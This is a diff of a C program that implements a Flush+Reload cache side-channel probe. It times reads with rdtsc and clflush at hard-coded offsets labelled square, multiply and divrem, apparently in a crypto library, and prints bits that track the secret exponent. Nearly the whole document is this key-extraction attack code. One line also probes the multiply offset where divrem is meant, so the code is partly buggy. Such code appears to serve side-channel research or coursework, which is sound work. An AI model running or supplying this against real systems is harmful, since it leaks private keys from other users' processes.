@@ -4,9 +4,10 @@
 #include <sys/types.h>
 #include <sys/stat.h>
 #include <fcntl.h>
-unsigned long THRESHOLD = 5;
-uint16_t probe(char* addr){
-    volatile unsigned long time;
+unsigned int THRESHOLD = 300;
+
+int probe(char* addr){
+    volatile unsigned int time;
     // read timestamp
     // move timestamp to another reg
     //cpuid
@@ -16,25 +17,28 @@ uint16_t probe(char* addr){
     //cflush
 
     asm __volatile__(
+        "mfence\n\t"
         "rdtsc\n\t"
-        "cpuid"
-        "mov %%eax, %%edi\n\t"
-        "cpuid"
+        "lfence\n\t"
+        "movl %%eax, %%edi\n\t"
         "movl (%1), %%eax \n\t"
-        "cpuid"
-        "rdstc"
+        "lfence\n\t"
+        "rdtsc\n\t"
         "subl %%edi, %%eax\n\t"
-        "movl %%eax, %0\n\t"
         "clflush 0(%1)\n\t"
-        :"=r"(time)
-        :"r"(addr)
+        :"=a"(time)
+        :"c"(addr)
+        :"edi","edx"
        
     );
+    //printf("time: %u\n",time);
+
+    
 
     return time < THRESHOLD;
 }
 void busy_wait(){
-    for(int i =0; i<2000; i++){
+    for(int i =0; i<5000; i++){
          asm __volatile__(
         "nop\n\t"
         );
@@ -52,14 +56,14 @@ int main(void){
    if(file_addr < 0){
        printf("error");
     }
-   char* sqr_addr= 
-   char* mul_addr = 
-   char* divrem_addr = 
+   int sqr_addr= 0x9f44c;
+   int mul_addr = 0x9fd80;
+   int divrem_addr = 0x9e57c;
    
    for(int i=0; i<5000; i++){
-       uint16_t sqr = probe(file_addr + sqr_addr);
-       uint16_t mul = probe(file_addr + mul_addr);
-       uint16_t divrem = probe(file_addr + mul_addr);
+       int sqr = probe(file_addr + sqr_addr);
+       int mul = probe(file_addr + mul_addr);
+       int divrem = probe(file_addr + mul_addr);
        if(sqr && mul && divrem){
            printf("1");
        }else{
